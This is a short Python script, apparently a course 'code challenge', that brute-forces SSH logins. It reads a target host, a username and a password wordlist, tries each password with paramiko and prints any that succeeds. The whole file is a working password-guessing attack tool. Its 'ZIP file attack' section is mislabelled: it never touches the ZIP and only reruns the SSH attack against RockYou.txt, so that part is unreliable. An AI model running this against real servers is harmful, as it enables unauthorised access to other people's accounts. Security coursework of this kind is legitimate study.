# Script Name:                 code challenge 18
# Author:                       Robert Gillespie
# Date of latest revision:      8/2/2023
# # Purpose:

import paramiko
import sys
import os
import socket
import termcolor
import zipfile

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code

def brute_force_attack(zip_file, wordlist_file):
    with open(wordlist_file, 'r', errors='ignore') as wordlist:
        for line in wordlist:
            password = line.strip()
            try:
                response = ssh_connect(password)
                if response == 0:
                    print(termcolor.colored(('[+] Found Password: ' + password + ' ,For Account: ' + username), 'green'))
                    break
                elif response == 1:
                    print('[-] Incorrect Login: ' + password)
                elif response == 2:
                    print('[!!] Can Not Connect')
                    sys.exit(1)
            except Exception as e:
                print(e)
                pass

if __name__ == "__main__":
    host = input('[+] Target Address: ')
    username = input('[+] SSH Username: ')
    input_file = input('[+] Passwords File: ')
    print('\n')

    if os.path.exists(input_file) == False:
        print('[!!] That File/Path Does Not Exist')
        sys.exit(1)

    with open(input_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            try:
                response = ssh_connect(password)
                if response == 0:
                    print(termcolor.colored(('[+] Found Password: ' + password + ' ,For Account: ' + username),'green'))
                    break
                elif response == 1:
                    print('[-] Incorrect Login: ' + password)
                elif response == 2:
                    print('[!!] Can Not Connect')
                    sys.exit(1)
            except Exception as e:
                print(e)
                pass

    # Add the new parameters for the ZIP file attack
    zip_file = "target.zip"  # Replace with the path to your password-protected ZIP file
    wordlist_file = "RockYou.txt"  # Replace with the path to the RockYou.txt wordlist

    brute_force_attack(zip_file, wordlist_file)
